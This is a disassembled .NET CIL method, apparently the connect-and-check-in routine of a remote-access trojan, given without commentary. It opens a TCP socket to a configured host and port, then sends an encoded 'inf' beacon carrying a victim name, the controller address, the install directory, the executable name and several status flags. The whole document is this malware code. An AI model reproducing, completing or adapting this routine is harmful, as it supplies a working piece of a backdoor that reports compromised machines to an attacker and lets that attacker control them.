  .method public static bool  connect() cil managed
  {
    // Code size       606 (0x25e)
    .maxstack  3
    .locals init (bool V_0,
             class [mscorlib]System.Exception V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             string V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.IO.FileInfo V_7,
             string V_8,
             string[] V_9)
    IL_0000:  ldc.i4.0
    IL_0001:  stsfld     bool j.OK::Cn
    IL_0006:  ldc.i4     0x7d0
    IL_000b:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0010:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_0015:  stloc.s    V_7
    IL_0017:  ldloc.s    V_7
    IL_0019:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
    .try
    {
      .try
      {
        IL_001e:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0023:  brfalse.s  IL_0045

        .try
        {
          IL_0025:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
          IL_002a:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
          IL_002f:  ldnull
          IL_0030:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
          IL_0035:  leave.s    IL_0045

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0037:  dup
          IL_0038:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_003d:  stloc.1
          IL_003e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0043:  leave.s    IL_0045

        }  // end handler
        .try
        {
          IL_0045:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
          IL_004a:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
          IL_004f:  leave.s    IL_006d

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0051:  dup
          IL_0052:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0057:  stloc.2
          IL_0058:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_005d:  leave.s    IL_006d

        }  // end handler
      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_005f:  dup
        IL_0060:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0065:  stloc.3
        IL_0066:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_006b:  leave.s    IL_006d

      }  // end handler
      .try
      {
        IL_006d:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0072:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
        IL_0077:  newobj     instance void [System]System.Net.Sockets.TcpClient::.ctor()
        IL_007c:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0081:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0086:  ldc.i4     0x32000
        IL_008b:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_ReceiveBufferSize(int32)
        IL_0090:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0095:  ldc.i4     0x32000
        IL_009a:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_SendBufferSize(int32)
        IL_009f:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00a4:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_00a9:  ldc.i4     0x2710
        IL_00ae:  callvirt   instance void [System]System.Net.Sockets.Socket::set_SendTimeout(int32)
        IL_00b3:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00b8:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_00bd:  ldc.i4     0x2710
        IL_00c2:  callvirt   instance void [System]System.Net.Sockets.Socket::set_ReceiveTimeout(int32)
        IL_00c7:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00cc:  ldsfld     string j.OK::H
        IL_00d1:  ldsfld     string j.OK::P
        IL_00d6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
        IL_00db:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Connect(string,
                                                                                         int32)
        IL_00e0:  ldc.i4.1
        IL_00e1:  stsfld     bool j.OK::Cn
        IL_00e6:  call       string j.OK::inf()
        IL_00eb:  call       bool j.OK::Send(string)
        IL_00f0:  pop
        .try
        {
          IL_00f1:  ldstr      "vn"
          IL_00f6:  ldstr      ""
          IL_00fb:  call       object j.OK::GTV(string,
                                                            object)
          IL_0100:  ldstr      ""
          IL_0105:  ldc.i4.0
          IL_0106:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                           object,
                                                                                                                                           bool)
          IL_010b:  brfalse.s  IL_0127

          IL_010d:  ldloc.s    V_4
          IL_010f:  ldsflda    string j.OK::VN
          IL_0114:  call       string j.OK::DEB(string&)
          IL_0119:  ldstr      "\r\n"
          IL_011e:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_0123:  stloc.s    V_4
          IL_0125:  br.s       IL_0152

          IL_0127:  ldloc.s    V_4
          IL_0129:  ldstr      "vn"
          IL_012e:  ldstr      ""
          IL_0133:  call       object j.OK::GTV(string,
                                                            object)
          IL_0138:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
          IL_013d:  stloc.s    V_8
          IL_013f:  ldloca.s   V_8
          IL_0141:  call       string j.OK::DEB(string&)
          IL_0146:  ldstr      "\r\n"
          IL_014b:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_0150:  stloc.s    V_4
          IL_0152:  ldc.i4.5
          IL_0153:  newarr     [mscorlib]System.String
          IL_0158:  stloc.s    V_9
          IL_015a:  ldloc.s    V_9
          IL_015c:  ldc.i4.0
          IL_015d:  ldloc.s    V_4
          IL_015f:  stelem.ref
          IL_0160:  ldloc.s    V_9
          IL_0162:  ldc.i4.1
          IL_0163:  ldsfld     string j.OK::H
          IL_0168:  stelem.ref
          IL_0169:  ldloc.s    V_9
          IL_016b:  ldc.i4.2
          IL_016c:  ldstr      ":"
          IL_0171:  stelem.ref
          IL_0172:  ldloc.s    V_9
          IL_0174:  ldc.i4.3
          IL_0175:  ldsfld     string j.OK::P
          IL_017a:  stelem.ref
          IL_017b:  ldloc.s    V_9
          IL_017d:  ldc.i4.4
          IL_017e:  ldstr      "\r\n"
          IL_0183:  stelem.ref
          IL_0184:  ldloc.s    V_9
          IL_0186:  call       string [mscorlib]System.String::Concat(string[])
          IL_018b:  stloc.s    V_4
          IL_018d:  ldloc.s    V_4
          IL_018f:  ldsfld     string j.OK::DR
          IL_0194:  ldstr      "\r\n"
          IL_0199:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_019e:  stloc.s    V_4
          IL_01a0:  ldloc.s    V_4
          IL_01a2:  ldsfld     string j.OK::EXE
          IL_01a7:  ldstr      "\r\n"
          IL_01ac:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_01b1:  stloc.s    V_4
          IL_01b3:  ldloc.s    V_4
          IL_01b5:  ldsfld     bool j.OK::Idr
          IL_01ba:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_01bf:  ldstr      "\r\n"
          IL_01c4:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_01c9:  stloc.s    V_4
          IL_01cb:  ldloc.s    V_4
          IL_01cd:  ldsfld     bool j.OK::IsF
          IL_01d2:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_01d7:  ldstr      "\r\n"
          IL_01dc:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_01e1:  stloc.s    V_4
          IL_01e3:  ldloc.s    V_4
          IL_01e5:  ldsfld     bool j.OK::Isu
          IL_01ea:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_01ef:  ldstr      "\r\n"
          IL_01f4:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_01f9:  stloc.s    V_4
          IL_01fb:  ldloc.s    V_4
          IL_01fd:  ldsfld     bool j.OK::BD
          IL_0202:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_0207:  call       string [mscorlib]System.String::Concat(string,
                                                                      string)
          IL_020c:  stloc.s    V_4
          IL_020e:  ldstr      "inf"
          IL_0213:  ldsfld     string j.OK::Y
          IL_0218:  ldloca.s   V_4
          IL_021a:  call       string j.OK::ENB(string&)
          IL_021f:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_0224:  call       bool j.OK::Send(string)
          IL_0229:  pop
          IL_022a:  leave.s    IL_0258

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_022c:  dup
          IL_022d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0232:  stloc.s    V_5
          IL_0234:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0239:  leave.s    IL_0258

        }  // end handler
      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_023b:  dup
        IL_023c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0241:  stloc.s    V_6
        IL_0243:  ldc.i4.0
        IL_0244:  stsfld     bool j.OK::Cn
        IL_0249:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_024e:  leave.s    IL_0258

      }  // end handler
    }  // end .try
    finally
    {
      IL_0250:  ldloc.s    V_7
      IL_0252:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
      IL_0257:  endfinally
    }  // end handler
    IL_0258:  ldsfld     bool j.OK::Cn
    IL_025d:  ret
  } // end of method OK::connect
